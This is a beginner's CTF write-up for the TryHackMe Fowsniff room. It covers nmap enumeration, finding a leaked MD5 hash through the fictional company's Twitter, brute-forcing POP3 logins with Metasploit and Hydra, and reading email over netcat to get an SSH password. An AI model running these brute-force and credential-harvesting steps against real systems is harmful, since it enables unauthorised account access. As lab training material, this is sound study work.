# 🎯 Fowsniff-CTF Writeup | Complete Exploitation Walkthrough

---

<div align="center">

![target Look](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KWyHAloxIdVGjmskuuvdVA.png)

</div>

---

## 📌 **Task Overview**

This boot2root machine is excellent for beginners. You will need to enumerate the machine by finding open ports, conducting online research (it's amazing how much information Google can provide), decoding hashes, brute-forcing POP3 logins, and much more!

This walkthrough is structured to guide you step by step through what you need to accomplish. Make sure you are [connected to the TryHackMe network](https://tryhackme.com/access)

**Credit to [berzerk0](https://twitter.com/berzerk0)** for creating this machine. *This machine is used here with the explicit permission of the creator* ❤️

---

## 🔍 **Question 1:** How Many Ports Are Open?

### 📊 Methodology: Nmap Enumeration

To answer the first question about open ports, we perform an Nmap scan. Our Nmap scan reveals the following results:

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: USER RESP-CODES PIPELINING AUTH-RESP-CODE SASL(PLAIN) CAPA UIDL TOP
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS more IDLE have post-login ENABLE IMAP4rev1 OK ID listed LITERAL+
```

**✅ Answer:** **4 ports are open** (22, 80, 110, 143)

---

## 🕵️ **Question 2:** Using the Information from the Open Ports. Look Around. What Can You Find?

Based on the enumeration above, we investigate the open ports further by accessing the target through different ports:

When accessing ports 110 and 143 through a web browser, we encounter the following error:

![ERR_UNSAFE_PORT](https://static-kb.siteground.com/wp-content/uploads/sites/2/2025/02/err-unsafe-port-chrome-1536x747.jpg)

This is expected since these are restricted ports. The Nmap scan with the `-A` flag already provided comprehensive information about the services running on these ports.

**Command Used:** `nmap -sV -A -O -Pn 10.49.175.51`

**Key Findings:**
- Port 22: SSH (OpenSSH)
- Port 80: HTTP (Apache)
- Port 110: POP3 (Dovecot)
- Port 143: IMAP (Dovecot)

---

## 🔎 **Question 3:** Using Google, Can You Find Any Public Information About Them?

### 📡 Passive Information Gathering

Based on the information gathered from our enumeration, we conduct OSINT (Open-Source Intelligence) research:

We searched for information about the Dovecot POP3 and IMAP versions but found no significant vulnerabilities in our initial research.

However, on the website homepage, we discovered a critical piece of information: **a data breach notification** stating that their [official Twitter account](https://x.com/FowsniffCorp) had been compromised. The attacker announced they would release the stolen data through this Twitter account.

![Fowsniff Page](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KWyHAloxIdVGjmskuuvdVA.png)

### 🐦 Twitter Investigation

After visiting the compromised Twitter account, we found multiple posts containing valuable information:

![Twitter account](https://private-user-images.githubusercontent.com/88498991/369710876-8cc0076b-1fdb-4be5-8ff5-10c7b241feab.png?jwt=******

**Note:** The links in the Twitter bio are no longer accessible, and the Pastebin links referenced in the posts have also expired:
- https://pastebin.com/378rLnGi (expired)
- https://pastebin.com/NrAqVeeX (expired)

However, one particular post contains **critical credentials**:

![interesting post](https://private-user-images.githubusercontent.com/88498991/369711355-26b02afe-1716-44a1-85fd-654d317c04d9.png?jwt=******

---

## 🔐 **Question 4:** What Is the System Administrator's Password Hash?

### 📌 Credential Discovery

This reveals that the sysadmin user has the following credentials:

```
Username: stone@fowsniff
Password Hash (MD5): a92b8a29ef1183192e3d35187e0cfabd
```

**Initial Attempts:** When we attempted to crack this hash using standard online resources, we were unsuccessful at first. The room documentation references [hashkiller.io](https://hashkiller.io/listmanager), which is a hash cracking service.

**✅ Answer:** `a92b8a29ef1183192e3d35187e0cfabd`

---

## 🎯 **Question 5:** Can You Use Metasploit to Brute Force the POP3 Login?

### 🔧 Attempting Metasploit Approach

We searched for POP3-related exploits in Metasploit:

```bash
search pop3d
```

This returned limited results, and exploitation attempts failed with the error:
```
[*] Exploit completed, but no session was created.
```

After further searching with `search pop3`, we identified a more promising auxiliary module:

```
use auxiliary/scanner/pop3/pop3_login
```

**Required Options:**
- RHOSTS (Target IP)
- LHOST (Local Host)
- RPORT (Remote Port)
- USER_FILE (Usernames)
- PASS_FILE (Passwords)

**Wordlists Used:**
- Users: `/home/Seclists/Usernames/xato-net-10-million-usernames.txt`
- Passwords: `/home/Seclists/Passwords/Leaked-Databases/rockyou-75.txt`

### ⚡ Optimized Approach: Using Hydra

Since Metasploit was too slow, we switched to **Hydra**, which provides significantly faster brute-forcing:

```bash
hydra -L usernames.txt -P passwords.txt pop3://<machine_ip>
```

**Result:** Within minutes, we obtained valid POP3 credentials!

---

## 📧 **Question 6:** What Was Seina's Password to the Email Service?

The brute-force attack revealed the email service credentials for user **seina**:

### 🔑 Accessing POP3 via Netcat

After obtaining the credentials, we connect to the POP3 service using Netcat:

```bash
nc <target_ip> 110
```

Once connected, we authenticate using POP3 commands:

```
USER seina
PASS [PASSWORD_REDACTED]
```

Upon successful authentication, the server responds:
```
+OK Logged in.
```

### 📬 Retrieving Email Messages

We list all available emails using the LIST command:

```
LIST
```

The server responds with:
```text
+OK 2 messages:
1 1622
2 1280
.
```

We retrieve the first message (ID: 1) which contains 1622 bytes:

```
RETR 1
```

### 📨 Critical Email Content

The retrieved email from the system administrator contains crucial information:

```mail
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
         id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "REDACTED"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

---

## ✅ Room Completion

🎉 **Congratulations!** You have successfully completed the Fowsniff-CTF room by:

✔️ Identifying open ports through Nmap enumeration  
✔️ Gathering OSINT information from public sources (Twitter)  
✔️ Discovering leaked credentials  
✔️ Brute-forcing POP3 authentication  
✔️ Retrieving sensitive information from email systems  
✔️ Uncovering the SSH temporary credentials  

### 🔑 Key Learning Points

- 🔍 **Information Disclosure:** Recognition of misconfigured web pages leaking sensitive data
- 🐦 **OSINT Gathering:** Social media reconnaissance for gathering intelligence
- 🔓 **Hash Cracking:** Techniques for recovering plaintext from compromised hashes
- 📧 **Protocol Manipulation:** Understanding POP3 protocol for email extraction
- 🛡️ **Post-Breach Communication:** Analysis of internal security incident response

---

<div align="center">

**Room Status:** ✅ **COMPLETE** 🏆

</div>
